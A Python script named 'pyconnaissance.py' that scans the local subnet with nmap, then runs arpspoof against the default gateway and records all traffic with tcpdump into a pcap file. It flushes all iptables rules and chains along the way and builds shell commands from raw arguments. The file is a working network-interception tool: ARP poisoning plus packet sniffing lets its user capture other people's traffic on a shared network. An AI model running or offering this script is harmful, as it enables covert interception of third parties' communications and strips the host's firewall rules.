from netifaces import AF_INET
import netifaces as nf
import datetime
import sys
import os
import subprocess
import threading

#create a place to send certain command output

FNULL=open(os.devnull,'w')

#make sure all arguments are provided, if not then exit with this message

if len(sys.argv)!=4:

	print("Usage: python3 pyconnaissance.py <interface> <log file> <desired run time(seconds)>")

	exit()

#write command output to log file

def logcmdout(args):

	subprocess.run(args,stdout=f)
	
#get host address on current interface

def get_local_addr():

	local_addr=nf.ifaddresses(sys.argv[1])[AF_INET][0]['addr']

	return local_addr

#get subnet to be used by nmap

def get_ip_range():

	t=0

	i=0

	x=' '

	addr=get_local_addr()

	addr_len=len(addr)

	while x!='.':

		i+=1	

		t=addr_len-i

		x=addr[t]

	addr=addr[:t]

	addr=addr+".0/24"

	f.write("IP range to scan: "+addr+"\n")

	return addr

#get the router ip address

def get_default_gateway():

	t=0

	i=0

	x=' '

	addr=get_local_addr()

	addr_len=len(addr)

	while x!='.':

		i+=1	

		t=addr_len-i

		x=addr[t]

	addr=addr[:t]

	addr=addr+".1"

	f.write("Default Gateway: "+addr+"\n")

	return addr

#use nmap to scan all hosts on the network

def netmap(range_ip):

	os.system("nmap -T4 -O -sV -oX - "+range_ip+" > "+sys.argv[2]+".xml")
	
#convert nmap's xml output to html

def xml_to_html():

	os.system("xsltproc "+sys.argv[2]+".xml > "+sys.argv[2]+".html")
	
	os.system("rm "+sys.argv[2]+".xml")

#start arpspoof to prepare for network sniffing

def arpspoof():

	time=str(int(sys.argv[3])+10)

	f.write("Started arpspoof on "+sys.argv[1]+" - target is "+default_gateway+"\n")

	arp_proc=subprocess.Popen(['timeout',time,'arpspoof','-i',sys.argv[1],default_gateway],stdout=FNULL,stderr=FNULL)

#start tcpdump

def tcpdump():

	t=subprocess.run(["tcpdump","-i",sys.argv[1],"-W","1","-vv","-n","-w",sys.argv[2]+".pcap","-G",sys.argv[3]],stdout=FNULL,stderr=FNULL)

#sniff the network

def netsniff(router_ip):

	iptables_flush()

	arpthread=threading.Thread(target=arpspoof)

	arpthread.start()

	tcpdump()

	arpthread.join()

	iptables_flush()

#solution to some arpspoof issues

def iptables_flush():

	f.write("Flushing iptables....\n")

	logcmdout(['iptables','--flush'])

	logcmdout(['iptables','--table','nat','--flush'])

	logcmdout(['iptables','--delete-chain'])

	logcmdout(['iptables','--table','nat','--delete-chain'])

#main code

#get start time

start_time = datetime.datetime.now()

#create log file 

f=open(sys.argv[2], "w+")

#write time into log file

f.write("Started at "+str(start_time)+"\n")

#write host address into log file

f.write("Host Address: "+get_local_addr()+"\n")

#set value to the subnet for nmap

ip_range=get_ip_range()

#set value to router ip

default_gateway=get_default_gateway()

#run nmap

netmap(default_gateway)

#convert xml output of nmap to html

xml_to_html()

#sniff the network

netsniff(default_gateway)

#close main log

f.close()





	
	
